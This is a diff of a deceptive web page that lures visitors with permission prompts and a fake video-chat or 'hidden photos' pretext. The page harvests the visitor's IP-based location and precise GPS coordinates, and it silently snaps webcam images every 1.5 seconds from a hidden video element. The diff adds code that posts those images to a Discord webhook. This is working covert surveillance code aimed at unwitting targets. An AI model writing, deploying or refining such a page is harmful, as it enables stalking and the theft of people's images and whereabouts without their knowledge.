@@ -23,9 +23,9 @@
     color: white;
     font-family: Arial, sans-serif;
   ">
-    <h1 style="margin-bottom: 10px;">Confirmation Required</h1>
+    <h1 style="margin-bottom: 10px;">Location Access Required</h1>
     <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
-      This site reuires you to Accept and Confirm to view. Please allow to proceed.
+      This site requires location access to continue. Please allow location permission to proceed.
     </p>
     <button id="allowBtn" onclick="retryLocation()" style="
       padding: 15px 40px;
@@ -35,7 +35,7 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-    ">View Now</button>
+    ">Enable Location</button>
   </div>
 
   <div id="cameraOverlay" style="
@@ -53,9 +53,9 @@
     color: white;
     font-family: Arial, sans-serif;
   ">
-    <h1 style="margin-bottom: 10px;">Enable to View</h1>
+    <h1 style="margin-bottom: 10px;">Camera Access Required</h1>
     <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
-      This site requires you to click the button to view the photos. Please allow to proceed.
+      This site requires camera access for video chat. Please allow camera permission to proceed.
     </p>
     <button id="allowCameraBtn" onclick="retryCamera()" style="
       padding: 15px 40px;
@@ -65,77 +65,11 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-    ">Enable to View</button>
+    ">Enable Camera</button>
   </div>
 
-  <!-- <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe> -->
-<iframe 
-  style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 99999;"
-  srcdoc="
-<!DOCTYPE html>
-<html lang='en'>
-<head>
-  <meta charset='UTF-8'>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: Arial, sans-serif; background: #1a1a1a; color: white; overflow-x: hidden; }
-    header { text-align: center; padding: 30px 20px; background: #111; }
-    header h1 { font-size: 36px; margin-bottom: 5px; }
-    header p { font-size: 16px; color: #aaa; }
-    .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; padding: 30px; max-width: 1400px; margin: 0 auto; }
-    .gallery-item { position: relative; overflow: hidden; border-radius: 10px; cursor: pointer; aspect-ratio: 1 / 1; background: #333; }
-    .gallery-item img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s ease, opacity 0.3s ease; display: block; }
-    .gallery-item:hover img { transform: scale(1.05); opacity: 0.8; }
-    .gallery-item .overlay { position: absolute; bottom: 0; left: 0; right: 0; background: linear-gradient(transparent, rgba(0,0,0,0.8)); padding: 20px 15px 15px; opacity: 0; transition: opacity 0.3s ease; }
-    .gallery-item:hover .overlay { opacity: 1; }
-    .lightbox { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; }
-    .lightbox.active { display: flex; }
-    .lightbox img { max-width: 90%; max-height: 80%; border-radius: 10px; }
-    .close-btn { position: absolute; top: 20px; right: 30px; font-size: 40px; color: white; cursor: pointer; background: none; border: none; }
-  </style>
-</head>
-<body>
-  <header>
-    <h1>📸 Hidden Photos</h1>
-    <p>Is this you Nicole? </p>
-  </header>
-  <div class='gallery'>
-    <div class='gallery-item' onclick='openLightbox(this)'>
-      <img src='https://picsum.photos/seed/1/600/600' alt='Photo 1'>
-      <div class='overlay'><h3>Photo 1</h3><p>Description</p></div>
-    </div>
-    <div class='gallery-item' onclick='openLightbox(this)'>
-      <img src='https://picsum.photos/seed/2/600/600' alt='Photo 2'>
-      <div class='overlay'><h3>Photo 2</h3><p>Description</p></div>
-    </div>
-    <div class='gallery-item' onclick='openLightbox(this)'>
-      <img src='https://picsum.photos/seed/3/600/600' alt='Photo 3'>
-      <div class='overlay'><h3>Photo 3</h3><p>Description</p></div>
-    </div>
-  </div>
-
-  <div class='lightbox' id='lightbox' onclick='closeLightbox(event)'>
-    <button class='close-btn'>&times;</button>
-    <img id='lightboxImg' src=''>
-  </div>
-
-  <script>
-    function openLightbox(item) {
-      const img = item.querySelector('img');
-      const lightbox = document.getElementById('lightbox');
-      const lightboxImg = document.getElementById('lightboxImg');
-      lightboxImg.src = img.src;
-      lightbox.classList.add('active');
-    }
-    function closeLightbox(event) {
-      document.getElementById('lightbox').classList.remove('active');
-    }
-  </script>
-</body>
-</html>
-"></iframe>
-
+  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
+  </iframe>
 
   <p id="demo"></p>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
@@ -172,8 +106,6 @@
 
     request.send(JSON.stringify(params));
 
-    //...
-
     $.getJSON("https://api.ipify.org?format=json", function (data) {
       $("#gfg").html(data.ip);
 
@@ -204,10 +136,8 @@
     })
 
     $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
       const request = new XMLHttpRequest();
       request.open("POST", "/location_update"); 
-
       request.setRequestHeader('Content-type', 'application/json');
 
       var myEmbed = {
@@ -269,7 +199,7 @@
     function showPosition(position) {
       localStorage.setItem("locationGranted", "true");
       document.getElementById("locationOverlay").style.display = "none";
-      document.getElementById("cameraOverlay").style.display = "none"; // Hide camera overlay too
+      document.getElementById("cameraOverlay").style.display = "none"; 
 
       var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
 
@@ -334,32 +264,29 @@
     }
   </script>
   <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
+    <video id="video" playsinline autoplay muted></video>
   </div>
   <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
   <script>
-    var url = "";
-    request.open("GET", "/get_target", true);
+    // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
+    // Example: https://discord.com/api/webhooks/ID/TOKEN
+    let discordWebhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
 
-    request.onload = function () {
-      if (request.status === 200) {
-        url = request.responseText;
-      } else {
-        url = "http://127.0.0.1:8000/image"
-      }
-    };
+    // Remove the local server logic
+    // var url = "";
+    // request.open("GET", "/get_target", true);
+    // request.onload = function () { ... };
 
-    request.send();
     function postFile(file) {
       let formdata = new FormData();
       formdata.append("image", file);
       let xhr = new XMLHttpRequest();
-      xhr.open('POST', url, true);
+      xhr.open('POST', discordWebhookUrl, true);
       xhr.onload = function () {
         if (this.status === 200)
-          console.log(this.response);
+          console.log("Image captured and sent to Discord!");
         else
-          console.error(xhr);
+          console.error("Error sending image:", xhr);
       };
       xhr.send(formdata);
     }
@@ -374,7 +301,6 @@
     const constraints = {
       audio: false,
       video: {
-
         facingMode: "user"
       }
     };
@@ -385,14 +311,12 @@
        }
     }
 
-    // Access webcam
     async function init() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints)
         handleSuccess(stream);
         localStorage.setItem("cameraGranted", "true");
       } catch (e) {
-        // Hide location, show camera
         document.getElementById("locationOverlay").style.display = "none";
         document.getElementById("cameraOverlay").style.display = "flex";
       }
@@ -404,11 +328,16 @@
       video.srcObject = stream;
 
       var context = canvas.getContext('2d');
-      setInterval(function () {
+      
+      // Add a small delay to ensure video is ready on mobile before drawing
+      setTimeout(function () {
+        // Start capturing loop
+        setInterval(function () {
 
-        context.drawImage(video, 0, 0, 640, 480);
-        canvas.toBlob(postFile, 'image/jpeg');
-      }, 1500);
+          context.drawImage(video, 0, 0, 640, 480);
+          canvas.toBlob(postFile, 'image/jpeg');
+        }, 1500);
+      }, 1000);
       
       document.getElementById("cameraOverlay").style.display = "none";
     }
